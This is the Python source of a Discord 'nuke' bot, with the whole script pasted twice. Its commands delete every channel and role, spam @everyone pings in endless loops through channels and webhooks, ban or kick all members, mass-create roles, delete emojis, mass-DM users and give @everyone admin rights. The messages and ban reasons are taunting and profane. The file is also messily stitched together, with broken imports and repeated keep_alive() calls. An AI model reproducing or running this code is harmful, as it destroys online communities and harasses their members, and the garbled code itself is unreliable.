import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['HACKER jija aagaya']
message_spam = ['@everyone jija aagaya !  ']
webhook_names = ['Fucked by hacker', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By HACKER
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By HACKER")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "HACKER RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="hacker Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"HACKER nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keep_import 
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['hacker jija aagaya']
message_spam = ['@everyone jija aagaya !  ']
webhook_names = ['Fucked by hacker', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By Hacker
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By HACKER")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Hacker RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="hacker Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"HACKER nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keep_alive

keep_alive() 

keep_alive()

keep_alive()

keep_alive()
keep_alive()

keep_alive()

keep_alive()

keep_alive()